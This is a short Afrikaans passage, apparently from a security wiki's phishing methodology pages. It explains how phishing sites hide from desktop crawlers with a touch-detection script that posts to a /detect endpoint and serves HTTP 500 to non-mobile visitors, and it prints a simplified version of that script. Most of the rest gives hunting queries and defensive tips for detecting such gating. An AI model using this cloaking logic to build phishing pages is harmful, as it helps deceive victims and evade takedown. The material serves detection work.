Operateurs sit toenemend hul phishing‑vloei agter 'n eenvoudige toestelkontrole sodat desktop crawlers nooit die finale bladsye bereik nie. 'n Algemene patroon is 'n klein skrip wat toets vir 'n touch-capable DOM en die resultaat na 'n server endpoint plaas; nie‑mobile kliënte ontvang HTTP 500 (of 'n leë bladsy), terwyl mobiele gebruikers die volle vloei bedien word.

Minimale kliëntsnippie (tipiese logika):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logika (vereenvoudigde):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Servergedrag wat gereeld waargeneem word:
- Stel 'n sessiekookie tydens die eerste laai.
- Aanvaar `POST /detect {"is_mobile":true|false}`.
- Gee 500 (of plekhouer) vir opvolgende GETs wanneer `is_mobile=false`; bedien phishing slegs as `true`.

Jag- en opsporingsheuristieke:
- urlscan navraag: `filename:"detect_device.js" AND page.status:500`
- Web-telemetrie: volgorde van `GET /static/detect_device.js` → `POST /detect` → HTTP 500 vir nie‑mobiele; regte mobiele slagofferpaaie gee 200 met daaropvolgende HTML/JS.
- Blokkeer of ondersoek bladsye wat inhoud uitsluitlik kondisioneer op `ontouchstart` of soortgelyke toestelkontroles.

Verdedigingswenke:
- Voer crawlers uit met mobiele‑agtige vingerafdrukke en JS aangeskakel om geslote inhoud te openbaar.
- Waarsku op verdagte 500‑antwoorde wat volg na `POST /detect` op pas geregistreerde domeine.

## Verwysings

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
